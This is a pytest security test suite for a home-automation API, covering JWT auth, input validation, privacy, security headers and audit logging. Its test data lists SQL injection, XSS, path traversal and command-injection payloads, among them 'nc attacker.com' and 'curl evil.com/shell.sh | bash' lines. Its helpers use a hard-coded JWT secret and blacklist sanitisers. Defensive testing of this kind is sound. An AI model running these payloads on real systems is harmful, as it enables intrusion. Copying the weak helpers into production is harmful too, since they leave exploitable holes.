import pytest
import asyncio
from datetime import datetime, timedelta
import jwt
import hashlib
import secrets
from fastapi import HTTPException
from fastapi.testclient import TestClient

from funkygibbon.core.models import HomeEntity, EntityType
from funkygibbon.security.auth import (
    create_access_token, verify_token, hash_password, verify_password
)
from funkygibbon.security.validation import InputValidator
from funkygibbon.api.main import app


class TestAuthentication:
    """Test authentication and authorization"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
    
    @pytest.fixture
    def test_user(self):
        """Create test user credentials"""
        return {
            "username": "testuser",
            "password": "SecureP@ssw0rd123!",
            "user_id": "user-123"
        }
    
    def test_password_hashing(self, test_user):
        """Test password hashing and verification"""
        # Hash password
        hashed = hash_password(test_user["password"])
        
        # Verify correct password
        assert verify_password(test_user["password"], hashed) is True
        
        # Verify incorrect password
        assert verify_password("WrongPassword", hashed) is False
        
        # Ensure different hashes for same password
        hashed2 = hash_password(test_user["password"])
        assert hashed != hashed2
    
    def test_jwt_token_creation(self, test_user):
        """Test JWT token creation and validation"""
        # Create token
        token = create_access_token(
            data={"sub": test_user["user_id"], "username": test_user["username"]},
            expires_delta=timedelta(hours=1)
        )
        
        # Verify token
        payload = verify_token(token)
        assert payload["sub"] == test_user["user_id"]
        assert payload["username"] == test_user["username"]
        assert "exp" in payload
    
    def test_expired_token(self, test_user):
        """Test expired token rejection"""
        # Create token that expires immediately
        token = create_access_token(
            data={"sub": test_user["user_id"]},
            expires_delta=timedelta(seconds=-1)
        )
        
        # Verify expired token is rejected
        with pytest.raises(jwt.ExpiredSignatureError):
            verify_token(token)
    
    def test_invalid_token(self):
        """Test invalid token rejection"""
        # Test malformed token
        with pytest.raises(jwt.InvalidTokenError):
            verify_token("invalid.token.here")
        
        # Test token with wrong signature
        fake_token = jwt.encode(
            {"sub": "fake-user"},
            "wrong-secret-key",
            algorithm="HS256"
        )
        
        with pytest.raises(jwt.InvalidSignatureError):
            verify_token(fake_token)
    
    def test_unauthorized_api_access(self, client):
        """Test API endpoints require authentication"""
        # Test entity creation without auth
        response = client.post("/api/entities", json={
            "entity_type": "device",
            "content": {"name": "Test Device"}
        })
        assert response.status_code == 401
        
        # Test entity retrieval without auth
        response = client.get("/api/entities/device")
        assert response.status_code == 401
        
        # Test sync without auth
        response = client.post("/api/inbetweenies/sync", json={
            "protocol_version": "inbetweenies-v1",
            "device_id": "test",
            "user_id": "test",
            "vector_clock": {},
            "changes": []
        })
        assert response.status_code == 401
    
    def test_authorized_api_access(self, client, test_user):
        """Test API access with valid authentication"""
        # Create valid token
        token = create_access_token(data={"sub": test_user["user_id"]})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Test authenticated access
        response = client.get("/api/health", headers=headers)
        assert response.status_code == 200
    
    def test_user_data_isolation(self, client):
        """Test users can only access their own data"""
        # Create tokens for two users
        user1_token = create_access_token(data={"sub": "user1"})
        user2_token = create_access_token(data={"sub": "user2"})
        
        # User 1 creates entity
        response = client.post(
            "/api/entities",
            headers={"Authorization": f"Bearer {user1_token}"},
            json={
                "entity_type": "device",
                "content": {"name": "User1 Device"}
            }
        )
        assert response.status_code == 201
        entity_id = response.json()["id"]
        
        # User 2 tries to access User 1's entity
        response = client.get(
            f"/api/entities/{entity_id}",
            headers={"Authorization": f"Bearer {user2_token}"}
        )
        assert response.status_code == 403  # Forbidden
    
    def test_rate_limiting(self, client, test_user):
        """Test rate limiting prevents abuse"""
        token = create_access_token(data={"sub": test_user["user_id"]})
        headers = {"Authorization": f"Bearer {token}"}
        
        # Make many rapid requests
        responses = []
        for _ in range(100):
            response = client.get("/api/entities/device", headers=headers)
            responses.append(response.status_code)
        
        # Should hit rate limit
        assert 429 in responses  # Too Many Requests


class TestInputValidation:
    """Test input validation and sanitization"""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_sql_injection_prevention(self, validator):
        """Test SQL injection attack prevention"""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM entities WHERE 1=1",
            "' UNION SELECT * FROM users--"
        ]
        
        for malicious_input in malicious_inputs:
            # Validator should sanitize or reject
            cleaned = validator.sanitize_string(malicious_input)
            assert "DROP" not in cleaned
            assert "DELETE" not in cleaned
            assert "--" not in cleaned
    
    def test_xss_prevention(self, validator):
        """Test XSS attack prevention"""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror="alert(1)">',
            '<iframe src="javascript:alert(1)">',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<svg onload="alert(1)">',
            'javascript:alert(1)'
        ]
        
        for payload in xss_payloads:
            cleaned = validator.sanitize_html(payload)
            assert "<script>" not in cleaned
            assert "javascript:" not in cleaned
            assert "onerror" not in cleaned
            assert "onload" not in cleaned
    
    def test_path_traversal_prevention(self, validator):
        """Test path traversal attack prevention"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "C:\\Windows\\System32\\",
            "../../config/secrets.json"
        ]
        
        for path in malicious_paths:
            assert validator.is_safe_path(path) is False
        
        # Valid paths should pass
        valid_paths = ["data/file.json", "images/photo.jpg", "docs/manual.pdf"]
        for path in valid_paths:
            assert validator.is_safe_path(path) is True
    
    def test_command_injection_prevention(self, validator):
        """Test command injection prevention"""
        dangerous_inputs = [
            "test; rm -rf /",
            "data && cat /etc/passwd",
            "file | nc attacker.com 1234",
            "`whoami`",
            "$(curl evil.com/shell.sh | bash)"
        ]
        
        for dangerous in dangerous_inputs:
            assert validator.is_safe_command_arg(dangerous) is False
    
    def test_entity_content_validation(self):
        """Test entity content validation"""
        # Test size limits
        large_content = {"data": "x" * 1000000}  # 1MB of data
        
        with pytest.raises(ValueError, match="Content too large"):
            entity = HomeEntity(
                entity_type=EntityType.DEVICE,
                content=large_content,
                user_id="test"
            )
        
        # Test nested content depth
        deeply_nested = {"level1": {"level2": {"level3": {"level4": {"level5": {}}}}}}
        
        with pytest.raises(ValueError, match="Content too deeply nested"):
            entity = HomeEntity(
                entity_type=EntityType.DEVICE,
                content=deeply_nested,
                user_id="test"
            )
    
    def test_safe_json_parsing(self, validator):
        """Test safe JSON parsing"""
        # Normal JSON should parse
        safe_json = '{"name": "Device", "value": 123}'
        parsed = validator.safe_json_parse(safe_json)
        assert parsed["name"] == "Device"
        
        # Malicious JSON should fail safely
        malicious_json = '{"__proto__": {"isAdmin": true}}'
        parsed = validator.safe_json_parse(malicious_json)
        assert "__proto__" not in parsed
        
        # Invalid JSON should return None
        invalid_json = '{"unclosed": '
        assert validator.safe_json_parse(invalid_json) is None


class TestDataPrivacy:
    """Test data privacy and encryption"""
    
    def test_sensitive_data_encryption(self):
        """Test sensitive fields are encrypted"""
        entity = HomeEntity(
            entity_type=EntityType.DEVICE,
            content={
                "name": "Security Camera",
                "password": "camera123",  # Should be encrypted
                "ip_address": "192.168.1.100",  # Should be masked
                "api_key": "sk-1234567890"  # Should be encrypted
            },
            user_id="test"
        )
        
        # Serialize to storage format
        stored_data = entity.model_dump()
        
        # Sensitive data should not be in plain text
        assert stored_data["content"]["password"] != "camera123"
        assert "192.168.1.100" not in str(stored_data)
        assert "sk-1234567890" not in str(stored_data)
    
    def test_pii_detection(self):
        """Test PII detection in content"""
        pii_content = {
            "name": "John Doe",
            "email": "john.doe@example.com",
            "phone": "+1-555-123-4567",
            "ssn": "123-45-6789",
            "credit_card": "4111111111111111"
        }
        
        entity = HomeEntity(
            entity_type=EntityType.NOTE,
            content=pii_content,
            user_id="test"
        )
        
        # PII should be flagged
        assert entity.contains_pii() is True
        
        # Non-PII content
        safe_content = {
            "device_name": "Light Switch",
            "room": "Living Room",
            "status": "on"
        }
        
        safe_entity = HomeEntity(
            entity_type=EntityType.DEVICE,
            content=safe_content,
            user_id="test"
        )
        
        assert safe_entity.contains_pii() is False
    
    def test_data_anonymization(self):
        """Test data anonymization for analytics"""
        entities = [
            HomeEntity(
                entity_type=EntityType.DEVICE,
                content={
                    "name": f"Device {i}",
                    "owner_name": f"User {i}",
                    "location": f"Room {i}"
                },
                user_id=f"user-{i}"
            )
            for i in range(10)
        ]
        
        # Anonymize for analytics
        anonymized = anonymize_entities(entities)
        
        # User IDs should be hashed
        for i, entity in enumerate(anonymized):
            assert entity.user_id != f"user-{i}"
            assert len(entity.user_id) == 64  # SHA256 hash
            
            # Personal info should be removed
            assert "owner_name" not in entity.content


class TestSecurityHeaders:
    """Test security headers and CORS"""
    
    @pytest.fixture
    def client(self):
        return TestClient(app)
    
    def test_security_headers(self, client):
        """Test security headers are set"""
        response = client.get("/api/health")
        
        # Check security headers
        assert response.headers.get("X-Content-Type-Options") == "nosniff"
        assert response.headers.get("X-Frame-Options") == "DENY"
        assert response.headers.get("X-XSS-Protection") == "1; mode=block"
        assert "Strict-Transport-Security" in response.headers
        
        # CSP header
        csp = response.headers.get("Content-Security-Policy")
        assert "default-src 'self'" in csp
        assert "script-src 'self'" in csp
    
    def test_cors_configuration(self, client):
        """Test CORS is properly configured"""
        # Test preflight request
        response = client.options(
            "/api/entities",
            headers={
                "Origin": "https://trusted-domain.com",
                "Access-Control-Request-Method": "POST"
            }
        )
        
        # Should allow from trusted origins
        assert response.headers.get("Access-Control-Allow-Origin") == "https://trusted-domain.com"
        assert "POST" in response.headers.get("Access-Control-Allow-Methods", "")
        
        # Test untrusted origin
        response = client.options(
            "/api/entities",
            headers={
                "Origin": "https://evil-site.com",
                "Access-Control-Request-Method": "POST"
            }
        )
        
        # Should not allow untrusted origins
        assert response.headers.get("Access-Control-Allow-Origin") != "https://evil-site.com"


class TestAuditLogging:
    """Test security audit logging"""
    
    async def test_authentication_logging(self):
        """Test authentication attempts are logged"""
        # Successful login
        audit_log = []
        
        # Mock successful auth
        await log_auth_attempt("user123", True, "192.168.1.100", audit_log)
        
        assert len(audit_log) == 1
        assert audit_log[0]["user_id"] == "user123"
        assert audit_log[0]["success"] is True
        assert audit_log[0]["ip_address"] == "192.168.1.100"
        
        # Failed login
        await log_auth_attempt("user123", False, "192.168.1.100", audit_log)
        
        assert len(audit_log) == 2
        assert audit_log[1]["success"] is False
    
    async def test_data_access_logging(self):
        """Test data access is logged"""
        audit_log = []
        
        # Log entity access
        await log_data_access(
            user_id="user123",
            entity_id="entity456",
            action="read",
            audit_log=audit_log
        )
        
        assert len(audit_log) == 1
        assert audit_log[0]["user_id"] == "user123"
        assert audit_log[0]["entity_id"] == "entity456"
        assert audit_log[0]["action"] == "read"
        assert "timestamp" in audit_log[0]
    
    async def test_suspicious_activity_detection(self):
        """Test detection of suspicious patterns"""
        # Simulate rapid failed login attempts
        failed_attempts = []
        
        for i in range(10):
            failed_attempts.append({
                "user_id": "user123",
                "timestamp": datetime.utcnow(),
                "ip_address": "192.168.1.100"
            })
        
        # Should detect brute force attempt
        is_suspicious = detect_brute_force(failed_attempts)
        assert is_suspicious is True
        
        # Normal activity
        normal_attempts = failed_attempts[:2]  # Only 2 attempts
        assert detect_brute_force(normal_attempts) is False


# Helper functions for security tests

def hash_password(password: str) -> str:
    """Hash password with salt"""
    salt = secrets.token_bytes(32)
    pwdhash = hashlib.pbkdf2_hmac('sha256', 
                                  password.encode('utf-8'), 
                                  salt, 
                                  100000)
    return salt.hex() + pwdhash.hex()


def verify_password(password: str, hashed: str) -> bool:
    """Verify password against hash"""
    salt = bytes.fromhex(hashed[:64])
    stored_hash = hashed[64:]
    pwdhash = hashlib.pbkdf2_hmac('sha256',
                                  password.encode('utf-8'),
                                  salt,
                                  100000)
    return pwdhash.hex() == stored_hash


def create_access_token(data: dict, expires_delta: timedelta = None):
    """Create JWT access token"""
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(hours=24))
    to_encode.update({"exp": expire})
    
    encoded_jwt = jwt.encode(to_encode, "SECRET_KEY", algorithm="HS256")
    return encoded_jwt


def verify_token(token: str):
    """Verify JWT token"""
    payload = jwt.decode(token, "SECRET_KEY", algorithms=["HS256"])
    return payload


def anonymize_entities(entities: list) -> list:
    """Anonymize entities for analytics"""
    anonymized = []
    
    for entity in entities:
        anon_entity = entity.model_copy()
        # Hash user ID
        anon_entity.user_id = hashlib.sha256(entity.user_id.encode()).hexdigest()
        
        # Remove PII from content
        if "owner_name" in anon_entity.content:
            del anon_entity.content["owner_name"]
        if "email" in anon_entity.content:
            del anon_entity.content["email"]
        if "phone" in anon_entity.content:
            del anon_entity.content["phone"]
        
        anonymized.append(anon_entity)
    
    return anonymized


async def log_auth_attempt(user_id: str, success: bool, ip_address: str, audit_log: list):
    """Log authentication attempt"""
    audit_log.append({
        "timestamp": datetime.utcnow(),
        "user_id": user_id,
        "success": success,
        "ip_address": ip_address,
        "event_type": "authentication"
    })


async def log_data_access(user_id: str, entity_id: str, action: str, audit_log: list):
    """Log data access"""
    audit_log.append({
        "timestamp": datetime.utcnow(),
        "user_id": user_id,
        "entity_id": entity_id,
        "action": action,
        "event_type": "data_access"
    })


def detect_brute_force(attempts: list, threshold: int = 5, window_minutes: int = 5) -> bool:
    """Detect brute force attempts"""
    if len(attempts) < threshold:
        return False
    
    # Check if attempts are within time window
    now = datetime.utcnow()
    recent_attempts = [
        a for a in attempts
        if (now - a["timestamp"]).total_seconds() < window_minutes * 60
    ]
    
    return len(recent_attempts) >= threshold


class InputValidator:
    """Input validation and sanitization"""
    
    def sanitize_string(self, value: str) -> str:
        """Remove dangerous SQL characters"""
        dangerous = ["--", ";", "/*", "*/", "DROP", "DELETE", "INSERT", "UPDATE"]
        result = value
        for d in dangerous:
            result = result.replace(d, "")
        return result.strip()
    
    def sanitize_html(self, value: str) -> str:
        """Remove dangerous HTML/JS"""
        import html
        # Basic HTML escaping
        escaped = html.escape(value)
        # Remove script tags and javascript:
        escaped = escaped.replace("javascript:", "")
        return escaped
    
    def is_safe_path(self, path: str) -> bool:
        """Check if path is safe"""
        dangerous = ["../", "..\\", "/etc", "C:\\", "\\Windows"]
        return not any(d in path for d in dangerous)
    
    def is_safe_command_arg(self, arg: str) -> bool:
        """Check if command argument is safe"""
        dangerous = [";", "&", "|", "`", "$", "(", ")", "{", "}", "[", "]"]
        return not any(d in arg for d in dangerous)
    
    def safe_json_parse(self, json_str: str) -> dict:
        """Safely parse JSON"""
        import json
        try:
            parsed = json.loads(json_str)
            # Remove proto pollution attempts
            if "__proto__" in parsed:
                del parsed["__proto__"]
            return parsed
        except:
            return None